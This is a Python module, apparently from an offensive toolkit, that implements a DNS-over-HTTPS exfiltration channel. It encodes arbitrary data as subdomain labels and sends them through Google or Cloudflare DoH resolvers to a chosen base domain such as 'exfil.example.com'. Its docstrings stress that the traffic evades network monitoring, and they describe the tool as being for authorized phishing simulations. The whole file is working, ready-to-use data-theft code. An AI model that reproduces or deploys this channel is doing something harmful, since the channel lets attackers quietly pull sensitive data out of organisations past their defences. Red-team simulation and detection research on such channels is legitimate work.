"""DNS-over-HTTPS (DoH) exfiltration channel for authorized phishing simulations.

DoH via Google/Cloudflare is encrypted DNS that looks like normal HTTPS to
the firewall. Unlike standard DNS exfil (subdomain queries), DoH traffic is
indistinguishable from regular HTTPS to network monitoring.

Usage:
    from dropoutjeep_lib.utils.doh_exfil import DohExfil
    doh = DohExfil(provider='google')
    doh.send_chunk('data.example.com', 'base64encodeddata')
"""

import base64
import logging
import struct
import time
from typing import Optional

import requests

logger = logging.getLogger("dropoutjeep")

DOH_PROVIDERS = {
    "google": {
        "url": "https://dns.google/dns-query",
        "method": "GET",  # Google supports GET with ?dns= param
        "accept": "application/dns-message",
    },
    "cloudflare": {
        "url": "https://cloudflare-dns.com/dns-query",
        "method": "POST",  # Cloudflare uses POST with binary body
        "accept": "application/dns-message",
    },
}

# DNS query types
DNS_TYPE_A = 1
DNS_CLASS_IN = 1


def _build_dns_query(domain: str) -> bytes:
    """Build a raw DNS wire-format query for a domain.

    This constructs a minimal DNS query message (header + single question)
    that can be sent over DoH.
    """
    # Header: ID (2), Flags (2), QDCOUNT (2), ANCOUNT (2), NSCOUNT (2), ARCOUNT (2)
    header = struct.pack('>HHHHHH',
        0x1234,     # Transaction ID (arbitrary for DoH)
        0x0100,     # Standard query, recursion desired
        1,           # QDCOUNT: 1 question
        0, 0, 0      # ANCOUNT, NSCOUNT, ARCOUNT
    )

    # Question section: QNAME + QTYPE + QCLASS
    qname = b''
    for label in domain.rstrip('.').split('.'):
        qname += struct.pack('B', len(label)) + label.encode('ascii')
    qname += b'\x00'  # Root label

    question = qname + struct.pack('>HH', DNS_TYPE_A, DNS_CLASS_IN)
    return header + question


class DohExfil:
    """DNS-over-HTTPS exfiltration channel.

    Encodes data as subdomain labels in DNS queries sent over HTTPS.
    The queries appear as normal HTTPS traffic to network monitoring.
    """

    def __init__(self, provider: str = "google", max_label_len: int = 63,
                 max_domain_len: int = 253, delay: float = 0.5):
        """Initialize DoH exfil channel.

        Args:
            provider: 'google' or 'cloudflare'
            max_label_len: Max DNS label length (63 per RFC)
            max_domain_len: Max total domain length (253 per RFC)
            delay: Delay between queries in seconds (avoid flooding)
        """
        if provider not in DOH_PROVIDERS:
            raise ValueError(f"Unknown DoH provider: {provider}. Use: {list(DOH_PROVIDERS.keys())}")
        self.provider = provider
        self.config = DOH_PROVIDERS[provider]
        self.max_label_len = min(max_label_len, 63)
        self.max_domain_len = max_domain_len
        self.delay = delay

    def _send_doh_query(self, domain: str) -> bool:
        """Send a single DoH query and return True if successful."""
        dns_query = _build_dns_query(domain)

        try:
            if self.config["method"] == "GET":
                # Google DoH: GET with ?dns=base64url(query)
                b64_query = base64.urlsafe_b64encode(dns_query).decode('ascii').rstrip('=')
                url = f"{self.config['url']}?dns={b64_query}"
                resp = requests.get(url, headers={"Accept": self.config["accept"]}, timeout=10)
            else:
                # Cloudflare DoH: POST with binary body
                resp = requests.post(
                    self.config["url"],
                    data=dns_query,
                    headers={
                        "Accept": self.config["accept"],
                        "Content-Type": "application/dns-message",
                    },
                    timeout=10,
                )

            if resp.status_code == 200:
                logger.debug("DoH query sent: %s (provider=%s)", domain, self.provider)
                return True
            else:
                logger.warning("DoH query failed: %s status=%d", domain, resp.status_code)
                return False
        except Exception as e:
            logger.warning("DoH query error: %s", e)
            return False

    def encode_data(self, data: bytes) -> list[str]:
        """Encode bytes into DNS-compatible subdomain labels.

        Splits base64-encoded data into chunks that fit within DNS label
        length limits (63 chars per label, 253 total).

        Returns a list of subdomain strings to query.
        """
        b64 = base64.b64encode(data).decode('ascii')
        # Replace + and / to stay DNS-safe
        b64 = b64.replace('+', '-').replace('/', '_')

        labels = []
        for i in range(0, len(b64), self.max_label_len):
            labels.append(b64[i:i + self.max_label_len])

        return labels

    def send_chunk(self, base_domain: str, data: str) -> bool:
        """Send a single chunk of data as a DNS query via DoH.

        Args:
            base_domain: The base domain (e.g., 'exfil.example.com')
            data: Base64-encoded data string (single label)

        Returns:
            True if the query was sent successfully.
        """
        if len(data) > self.max_label_len:
            logger.warning("Data chunk too long (%d > %d), will be truncated by DNS",
                           len(data), self.max_label_len)

        query_domain = f"{data}.{base_domain}"
        if len(query_domain) > self.max_domain_len:
            logger.error("Domain too long: %d > %d", len(query_domain), self.max_domain_len)
            return False

        return self._send_doh_query(query_domain)

    def exfiltrate(self, data: bytes, base_domain: str) -> bool:
        """Exfiltrate arbitrary bytes over DoH.

        Splits data into DNS-safe chunks, sends each as a subdomain query.

        Args:
            data: Raw bytes to exfiltrate
            base_domain: Base domain for queries (e.g., 'exfil.example.com')

        Returns:
            True if all chunks were sent successfully.
        """
        chunks = self.encode_data(data)
        if not chunks:
            return True

        all_sent = True
        for chunk in chunks:
            success = self.send_chunk(base_domain, chunk)
            if not success:
                all_sent = False
            time.sleep(self.delay)

        logger.info("DoH exfil complete: %d chunks sent, domain=%s, success=%s",
                    len(chunks), base_domain, all_sent)
        return all_sent

    def exfiltrate_string(self, text: str, base_domain: str) -> bool:
        """Convenience method to exfiltrate a string."""
        return self.exfiltrate(text.encode('utf-8'), base_domain)
